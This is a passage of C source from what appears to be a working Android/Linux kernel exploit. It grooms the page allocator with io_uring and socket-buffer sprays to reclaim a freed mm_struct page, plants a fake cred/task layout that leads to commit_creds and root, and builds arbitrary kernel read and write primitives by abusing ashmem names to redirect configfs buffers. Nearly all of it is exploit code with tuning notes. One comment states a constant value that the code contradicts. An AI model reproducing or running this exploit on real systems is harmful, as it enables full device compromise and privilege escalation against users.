   * allocations may never split down to. This kernel's __rmqueue_pcplist
   * does NOT refill the PCP from the buddy (an empty list just fails over
   * to the buddy), so a burst of order-2 allocations genuinely empties
   * the list and keeps the count far below the flush threshold. */
  int reclaim_probe = env_flag("RECLAIM_PROBE", 0);
  if (env_flag("USE_URING", 1) && !reclaim_probe) {
    int burst = env_int_range("PCP_DRAIN_BURST", 24, 0, 256);
    for (int i = 0; i < burst; i++)
      reclaim_one_uring(2000 + i);
    pr_info("PCP drain burst: %d rings total\n", uring_count / 2);
  }

  /* PCP COUNT DRAIN: pcp->count is shared across migratetypes and
   * orders, and free_unref_page_commit() flushes the ENTIRE pcp list to
   * the buddy (where the freshly discarded mm page merges with its
   * usually-free buddy into order-3+ blocks) whenever count >= high at
   * commit. Background order-0 frees keep the count near high on this
   * device, so the discard lands in the buddy instead of waiting at the
   * order-2 PCP head for the drain-loop io_uring allocation. Fault in a
   * few MB of anonymous pages right before the drain window: order-0
   * MOVABLE allocations decrement the SAME per-cpu count, dropping it
   * far below high, so the discard commit cannot flush. The mapping is
   * kept (munmap would push the count back up). MADV_NOHUGEPAGE keeps
   * the faults order-0 - a THP fault would allocate order-9 pages,
   * which bypass the PCP entirely. */
  if (env_flag("PCP_COUNT_DRAIN", 1) && !reclaim_probe) {
    size_t mb = (size_t)env_int_range("PCP_COUNT_DRAIN_MB", 8, 0, 64);
    if (mb) {
      /* mmap WITHOUT MAP_POPULATE, advise against THP first, then fault
       * the pages in manually so every fault is a genuine order-0 PCP
       * allocation. MADV_NOHUGEPAGE (24) is not defined by the NDK
       * headers - a THP fault would allocate order-9 pages, which
       * bypass the PCP entirely. */
#ifndef MADV_NOHUGEPAGE
#define MADV_NOHUGEPAGE 15
#endif
      void *drain = mmap(NULL, mb << 20, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      int thp_ok = 0;
      if (drain != MAP_FAILED) {
        thp_ok = madvise(drain, mb << 20, MADV_NOHUGEPAGE) == 0;
        memset(drain, 1, mb << 20); /* fault every page in */
      }
      pr_info("pcp count drain: %zu MB anon pages (nohugepage=%d)%s\n",
              mb, thp_ok, drain == MAP_FAILED ? " FAILED" : "");
    }
  }

  /* DRAIN + INTERLEAVED ORDER-2/ORDER-3 RECLAIM: close one prepare mem fd
   * per FULL prepare slab (freeing its mm = one first-free push, +1
   * pobject), then spray one order-2 (io_uring rings/SQEs) AND one order-3
   * (DGRAM skb, kmalloc-16k) allocation. The order-3 spray matters because
   * the discarded page is only at the PCP head until the PCP is flushed:
   * past that point it lives in the buddy free lists, where it can MERGE
   * with its buddy into an order-3 block - and a kmalloc-16k object is
   * exactly one 16KB half of a 32KB slab with our payload at its start, so
   * a captured skb covers either half. */
  static char pti[16384];
  {
    int drain_kills = env_int_range("DRAIN_KILLS", 16, 1, 512);
    int use_uring = env_flag("USE_URING", 1) && !reclaim_probe;
    for (int i = 0; i < drain_kills; i++) {
      size_t idx = (size_t)(FLUSH_KILLS + i) * mm_objs_per_slab;
      if (idx < prepare_ctx.mm_cnt && prepare_ctx.childs[idx] > 0) {
        kill_child(prepare_ctx.childs[idx]);
        prepare_ctx.childs[idx] = 0;
      }
      if (idx < prepare_ctx.mm_cnt && prepare_ctx.memfds[idx] > 0) {
        close(prepare_ctx.memfds[idx]); /* free -> +1 pobject */
        prepare_ctx.memfds[idx] = -1;
      }
      if (use_uring)
        reclaim_one_uring(i);
      else if (!reclaim_probe) {
        errno = 0;
        if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) > 0)
          g_skb_reclaim = 1;
      }
    }
    pr_info("io_uring reclaim: %d rings, payload in rings+sqes mappings (mm page=0x%zx)\n",
            uring_count / 2,
            (size_t)(last_mm_struct & ~(MM_SLAB_SIZE - 1)));
  }

  /* SPECTRUM SPRAY (multi-order reclaim): if the discarded page was
   * flushed to the buddy at commit (count >= high) it merges with its
   * free buddy into an order-3..7 block, and no amount of order-2
   * allocation ever splits back into it. io_uring rings/SQEs at larger
   * entry counts allocate order-3..7 pages directly, capturing the
   * merged block wherever it sits. The payload is replicated into every
   * 16KB sub-block of every mapping, so whichever block the kernel sees
   * as the mm page presents the full fake layout with self-consistent
   * pointers. */
  if (env_flag("SPECTRUM_SPRAY", 1) &&
      env_flag("USE_URING", 1) && !reclaim_probe) {
    static const unsigned spec_entries[] = { 512, 1024, 2048, 4096, 8192 };
    static const int spec_per[] =          { 8,   8,    6,     4,     4 };
    int spec_total = 0;
    for (size_t si = 0;
         si < sizeof(spec_entries) / sizeof(spec_entries[0]); si++) {
      for (int i = 0; i < spec_per[si]; i++) {
        if (!reclaim_one_uring_size(4000 + (int)si * 100 + i,
                                    spec_entries[si]))
          break;
        spec_total++;
      }
    }
    pr_info("spectrum spray: %d multi-order rings (orders 3..7), "
            "total rings=%d\n", spec_total, uring_count / 2);
  }

  /* MOVABLE STORM (the migratetype-fallback capture). When mm_cachep
   * allocated the target slab from the MOVABLE fallback (the buddy's
   * UNMOVABLE freelist was momentarily empty - the state change that
   * collapsed the reclaim rate on this device), the discarded page is
   * typed MIGRATE_MOVABLE forever: it lands on the PCP MOVABLE order-2
   * list, and the PCP serves ONLY the requested migratetype, so no
   * GFP_KERNEL allocation (every io_uring ring) can ever take it -
   * the freed page just sits there, which is exactly what the panic
   * registers show (the stale mm->start_code still present at walk
   * time after 200+ order-2..7 UNMOVABLE allocations).
   *
   * The storm: (A) alloc+free cycles push pcp->count over high so the
   * flush drains the MOVABLE order-2 list (and our page) into the
   * buddy; (B) a large order-0 MOVABLE fault region then drains the
   * buddy's low-order MOVABLE freelist and SPLITS the order-2 block -
   * the mm page's four base pages become user pages of this region,
   * and the direct-map alias keeps pointing at base page 0 (the linear
   * map covers all RAM). The 4KB page-0 payload template replicated at
   * every page of the region guarantees that whichever user page backs
   * mm_page+0 presents the full fake lock/waiter/task layout (all
   * payload offsets the walk touches are < 0x1000). The region is
   * registered as a pseudo-mapping with 4KB blocks for the WALKCHK /
   * plan / quiesce machinery.
   *
   * Storm captures are NO-EXEC: the fake cred's page-1 fields
   * (fake_user_ns used as the ucounts-walk terminator, ucount_max) are
   * not under our control once the base pages scatter, so the
   * commit_creds path at execve is unsafe there - root + battery only. */
  if (env_flag("MOVABLE_STORM", 1) && !reclaim_probe) {
    size_t mb = (size_t)env_int_range("MOVABLE_STORM_MB", 128, 0, 256);
#ifndef MADV_NOHUGEPAGE
#define MADV_NOHUGEPAGE 15
#endif
    if (mb) {
      /* phase A: flush cycles - OPT-IN ONLY (MOVABLE_STORM_FLUSH=1).
       * The cycles push pcp->count over high to flush a MOVABLE-typed
       * target into the buddy (the only way order-0 faults can reach a
       * PCP order-2 list entry). But they ALSO flush an UNMOVABLE-typed
       * target that is still waiting on the PCP order-2 head into the
       * buddy, where it merges and becomes unrecoverable - with the
       * UNMOVABLE seed active the target is usually UNMOVABLE-typed and
       * the drain-loop ring should take it from the PCP head directly,
       * so the flush cycles are disabled by default. */
      if (env_flag("MOVABLE_STORM_FLUSH", 0)) {
        for (int c = 0; c < 3; c++) {
          size_t csz = 4 << 20;
          void *cf = mmap(NULL, csz, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
          if (cf == MAP_FAILED)
            break;
          if (madvise(cf, csz, MADV_NOHUGEPAGE) == 0)
            memset(cf, 1, csz); /* order-0 MOVABLE allocs */
          munmap(cf, csz);      /* frees -> count spikes -> PCP flush */
        }
      }
      /* phase B: the storm region (kept until the next attempt) */
      size_t rsz = mb << 20;
      uint8_t *reg = mmap(NULL, rsz, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      if (reg != MAP_FAILED && madvise(reg, rsz, MADV_NOHUGEPAGE) == 0) {
        memset(reg, 0, rsz); /* fault every page in (order-0 MOVABLE) */
        /* replicate the 4KB page-0 template at every 4KB page */
        for (size_t off = 0; off + 0x1000 <= rsz; off += 0x1000)
          memcpy(reg + off, skb_buf, 0x1000);
        if (uring_count + 1 <= URING_MAX) {
          g_storm_block_start = 0;
          for (int m = 0; m < uring_count && m < URING_MAX; m++) {
            size_t sz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
            size_t stride = uring_mapstride[m] ? uring_mapstride[m] : MM_SLAB_SIZE;
            if (sz >= stride)
              g_storm_block_start += (long)(sz / stride);
          }
          uring_maps[uring_count] = reg;
          uring_mapsz[uring_count] = rsz;
          uring_mapstride[uring_count] = 0x1000;
          uring_count++;
          g_storm_region = reg;
          g_storm_size = rsz;
          pr_info("movable storm: %zu MB, storm blocks start at %ld\n",
                  mb, g_storm_block_start);
        }
      } else {
        pr_warning("movable storm: mmap/madvise failed errno=%d\n", errno);
        if (reg != MAP_FAILED)
          munmap(reg, rsz);
      }
    }
  }

  /* RECLAIM_PROBE diagnostic: skip the sprays and instead leak the mm of
   * a freshly forked child. Its mm allocation comes from CORE's mm cache
   * (active slab -> CPU partial -> node partial), and the emptied target
   * page is exactly the most recent entry there - so if the page NEVER
   * LEFT the mm cache (discard failed: contamination, or the page was
   * never unfrozen), the probe child's mm lands ON the target page. If it
   * lands elsewhere, the discard worked and the page-allocator reclaim is
   * what missed. Also dumps /proc/pagetypeinfo's free counts so the
   * migratetype of the freed order-2 pages is visible in the delta. */
  if (env_flag("RECLAIM_PROBE", 0)) {
    int fd = open("/proc/pagetypeinfo", O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, pti, sizeof(pti) - 1);
      if (n > 0) {
        pti[n] = 0;
        pr_info("PAGETYPEINFO BEFORE:\n%s", pti);
      }
      close(fd);
    }
  }
  if (env_flag("RECLAIM_PROBE", 0)) {
    struct kernelsnitch_shared_state *ks2 =
      kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
                         env_int_range("KSNITCH_VERBOSE", 0, 0, 1), 0);
    pid_t probe = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
    if (probe == 0) {
      pin_to_core(CORE);
      kernelsnitch_find_collisions(ks2);
      /* self-exit so an aborted probe does not leak the 4096-thread pile */
      {
        struct timespec ts = {.tv_sec = 30, .tv_nsec = 0};
        nanosleep(&ts, NULL);
        _exit(0);
      }
    }
    int wait_ms = 0;
    while (ks2->state == KERNELSNITCH_INIT && wait_ms < 120000) {
      usleep(1000);
      wait_ms++;
    }
    if ((int)kernelsnitch_found_collisions(ks2)) {
      kernelsnitch_bruteforce(ks2);
      uintptr_t mm2 = ks2->mm_struct;
      uintptr_t page1 = last_mm_struct & ~(MM_SLAB_SIZE - 1);
      uintptr_t page2 = mm2 & ~(MM_SLAB_SIZE - 1);
      pr_info("RECLAIM_PROBE: target mm=0x%zx (page 0x%zx obj %zu), probe child mm=0x%zx (page 0x%zx obj %zu) -> %s\n",
              last_mm_struct, page1,
              (size_t)((last_mm_struct & (MM_SLAB_SIZE - 1)) / MM_STRUCT_SZ),
              mm2, page2, (size_t)((mm2 & (MM_SLAB_SIZE - 1)) / MM_STRUCT_SZ),
              page1 == page2 ? "SAME PAGE (discard FAILED - page is still an mm slab)"
                             : "different pages (discard worked; reclaim missed)");
    } else {
      pr_warning("RECLAIM_PROBE: probe child collisions not found\n");
    }
    kernelsnitch_cleanup(ks2);
    {
      int fd = open("/proc/pagetypeinfo", O_RDONLY);
      if (fd >= 0) {
        ssize_t n = read(fd, pti, sizeof(pti) - 1);
        if (n > 0) {
          pti[n] = 0;
          pr_info("PAGETYPEINFO AFTER:\n%s", pti);
        }
        close(fd);
      }
    }
    pr_info("RECLAIM_PROBE: done, exiting before walk\n");
    exit(0);
  }

  /* Final alternating spray: enough order-2 and order-3 allocations to
   * capture the target wherever the page allocator put it (PCP order-2
   * head, buddy order-2 list after a PCP flush, or inside a merged
   * order-3 block). Skipped in RECLAIM_PROBE mode so the freed pages stay
   * visible in /proc/pagetypeinfo. */
  if (!reclaim_probe) {
    int spray_n = env_int_range("RECLAIM_SPRAY", 24, 0, 128);
    int use_uring = env_flag("USE_URING", 1);
    for (int i = 0; i < spray_n; i++) {
      if (use_uring)
        reclaim_one_uring(1000 + i);
      errno = 0;
      if (sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT) > 0)
        g_skb_reclaim = 1;
    }
    pr_info("final reclaim spray done (uring rings=%d, skbs sent)\n",
            uring_count / 2);
  }

  /* Spray mem fds: closed late on purpose - their pushes must not bring
   * the CPU-partial accumulator near the overflow threshold while the
   * target page still holds live objects (see the choreography above). */
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    if (spray_ctx.memfds[i] > 0) {
      close(spray_ctx.memfds[i]);
      spray_ctx.memfds[i] = -1;
    }
  }

  /* Hygiene frees (order-3 skb data / fd only) - moved here so nothing
   * runs between the leak kill and the first rings allocation. */
  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }

  /* Fallback: DGRAM sendmsg spray */
  if (uring_count == 0) {
    for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
      errno = 0;
      ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
      if (sent <= 0) break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] > 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = env_int_range("FOPS_MAX_ATTEMPTS", 24, 4, 72);
  }
  struct timespec deadline;
  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += 180;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      pr_info("prepare_kernel_page ok attempt=%d\n", attempt);
      return base;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec >= deadline.tv_sec) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
  }
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* Accessor functions used by fops.c */
uintptr_t pselect_write_value(void) {
  return pselect_custom_value;
}
uintptr_t pselect_write_target(void) {
  return pselect_custom_target;
}
int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}
int pselect_write_shape(void) {
  return 1;
}
void set_pselect_write(uintptr_t target, uintptr_t value) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = 1;
}

/* Environment variable helpers used by fops.c */
int env_flag(const char *name, int def) {
  char *v = getenv(name);
  if (!v) return def;
  return atoi(v);
}

int env_int_range(const char *name, int def, int min, int max) {
  char *v = getenv(name);
  if (!v) return def;
  int val = (int)strtol(v, NULL, 0);
  if (val < min) return min;
  if (val > max) return max;
  return val;
}

unsigned long env_ulong(const char *name, unsigned long def) {
  char *v = getenv(name);
  if (!v) return def;
  return strtoul(v, NULL, 0);
}
